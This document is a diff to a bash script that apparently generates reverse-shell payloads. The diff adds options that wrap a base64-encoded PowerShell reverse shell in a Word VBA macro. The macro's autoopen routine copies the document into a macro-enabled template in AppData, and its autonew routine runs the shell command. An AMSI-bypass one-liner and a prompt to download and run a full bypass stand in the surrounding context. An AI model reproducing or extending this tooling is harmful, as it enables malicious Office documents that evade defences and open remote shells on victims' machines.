@@ -623,7 +623,7 @@ then
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$null,\$true);"
 
-    echo -en "Do you wish to automatically download and run full AMSI bypass?"
+    echo -en "\nDo you wish to automatically download and run full AMSI bypass?"
         greenprint "[Y/n]"
         read -r -n 1 ans
     case $ans in
@@ -695,6 +695,38 @@ shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
 rev="${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
 
 
+if [[ $5 == "vba" ]] 
+then
+    split=$(echo $rev | fold -w50)
+    l1=$(echo -n Str = \""$split" | head -n1)
+    l1=$(printf "$l1\"\n")
+    re=$(echo "$split" | sed 1d | while read line; do echo "Str = Str + \"$line\"";done)
+    
+
+rev=$(printf "
+Sub autoopen()
+    
+
+    curfile = ActiveDocument.Path & \"\\\\\" & ActiveDocument.Name
+    templatefile = Environ(\"appdata\") & \"\\Microsoft\Templates\\\\\" & DateDiff(\"s\", #1/1/1970#, Now()) & \".dotm\"
+    ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True
+    ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdFormatXMLDocumentMacroEnabled
+    Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0
+    
+
+    
+End Sub
+
+Sub autonew()
+    Dim Str As String
+    $l1\n$re
+
+    Shell (Str)
+End Sub
+")
+
+fi
+
 if [[ $1 == "url" ]] 
 then
     rev=$(urlencodeme "$rev")
@@ -706,9 +738,9 @@ fi
 
 if [[ $OS == "Darwin" ]]
 then
-   echo -n $rev | pbcopy
+   echo -n "$rev" | pbcopy
 else 
-    echo -n $rev | xclip -sel c
+    echo -n "$rev" | xclip -sel c
 fi
 
     listen $4
@@ -1603,7 +1635,7 @@ listen
 function listen () {
 header
 printf "The following has been copied to your clipboard:\n\n"
-echo $rev
+echo "$rev"
 printf "\n\n"
 if [[ $1 == "udp" ]]
 then
@@ -1874,6 +1906,8 @@ $(greenprint '15)') Powershell UDP - Windows Core Double URL encoded
 $(greenprint '16)') Powershell UDP - Core
 $(greenprint '17)') Powershell UDP - Core URL encoded
 $(greenprint '18)') Powershell UDP - Core Double URL encoded
+$(greenprint '19)') Powershell TCP - Windows - VBA Macro
+$(greenprint '20)') Powershell UDP - Windows - VBA Macro
 $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
@@ -1933,6 +1967,12 @@ Choose an option:  "
         ;;
     18)
         powershell_s "urlx2" "core" "" "udp"
+        ;;
+    19)
+        powershell_s "" "" "w" "" "vba"
+        ;;
+    20)
+        powershell_s "" "" "w" "udp" "vba"
         ;;
     m)
         mainmenu
